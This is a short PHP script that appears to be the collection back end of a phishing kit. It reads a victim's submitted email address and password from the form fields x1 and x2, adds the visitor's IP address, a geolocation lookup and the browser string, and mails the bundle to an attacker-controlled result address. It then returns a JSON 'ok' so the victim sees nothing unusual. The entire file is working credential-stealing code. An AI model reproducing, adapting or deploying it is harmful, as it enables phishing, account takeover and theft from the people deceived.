<?php
// session_start();
include("rb-tm.php");

	if($_POST){

  $ip = getenv('HTTP_CLIENT_IP')?:
  getenv('HTTP_X_FORWARDED_FOR')?:
  getenv('HTTP_X_FORWARDED')?:
  getenv('HTTP_FORWARDED_FOR')?:
  getenv('HTTP_FORWARDED')?:
  getenv('REMOTE_ADDR');
	$ip = strtok($ip, ',');

  $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
  if($query && $query['status'] == 'success') {
    $ipDetails = 'This visitor visited from '.$query['country'].', '.$query['regionName'] .', '.$query['city'].' with IP Address of - '.$query['query'];
  } else {
    $ipDetails = 'Unable to get location - '.$ip;
  }		
	/* Gathering Data Variables */

	$email = $_POST['x1'];
	$pass = $_POST['x2'];
	$subject = "Log From: $email | $name";

	$browser =  $_SERVER['HTTP_USER_AGENT'];

		$body = "
	Email Address: <strong>$email</strong><br>
	Login Password: <strong>$pass</strong><br>
	IP Details: $ipDetails <br>
	Browser: <strong>$browser<strong>";


	$headers = "From: Noreply\r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

	$success = mail($resultBox, $subject, $body, $headers);


	echo json_encode(array('signal' => 'ok', 'sent'=>$success ));		
}	



exit();
  

?>